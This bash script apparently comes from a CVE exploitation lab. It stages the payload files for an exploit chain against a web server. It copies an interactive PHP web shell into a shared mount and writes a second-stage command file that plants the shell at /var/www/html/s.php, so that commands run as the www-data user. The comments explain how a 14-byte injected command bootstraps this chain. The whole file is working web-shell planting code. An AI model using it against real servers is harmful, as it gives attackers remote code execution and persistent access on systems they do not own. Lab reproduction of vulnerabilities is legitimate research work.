#!/usr/bin/env bash
# Stage the payload files the exploit will pull in.
#
# Idempotent, and deliberately does NOT restart containers: everything here
# lives on the /out bind mount, so it can be re-run in under a second.
# reset.sh calls this too, so there is exactly one definition of the payload.
#
# Why these files exist at all: the exploit only delivers 14 bytes of command
# (167-byte carrier - 0x98 header - NUL), so the chain is
#   sh</out/x   ->   out/x   ->   /var/www/html/s.php
#
# Scope: this lab stops at code execution as the web user. There is no
# privilege-escalation step -- the CVE gives you www-data, and that is what is
# demonstrated here.
cd "$(dirname "$0")" || exit 1

mkdir -p out
chmod 777 out 2>/dev/null || true

# The interactive shell the /s.php endpoint serves.
cp assets/shell.php out/.shell.php

# The 14-byte command reads this file as stdin.
cat > out/x <<'EOF'
cp /out/.shell.php /var/www/html/s.php
chmod 644 /var/www/html/s.php
EOF
chmod 755 out/x

echo "[+] staged: out/x out/.shell.php"

